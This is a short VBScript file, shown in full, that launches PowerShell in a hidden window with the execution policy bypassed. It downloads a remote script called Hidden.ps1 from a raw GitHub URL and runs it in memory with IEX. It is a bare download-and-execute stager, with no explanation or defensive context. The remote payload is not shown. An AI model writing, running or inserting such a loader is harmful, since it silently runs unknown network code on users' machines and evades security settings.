Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cmcmorris/cmd-scripts/refs/heads/General/Hidden.ps1')""", 0, False
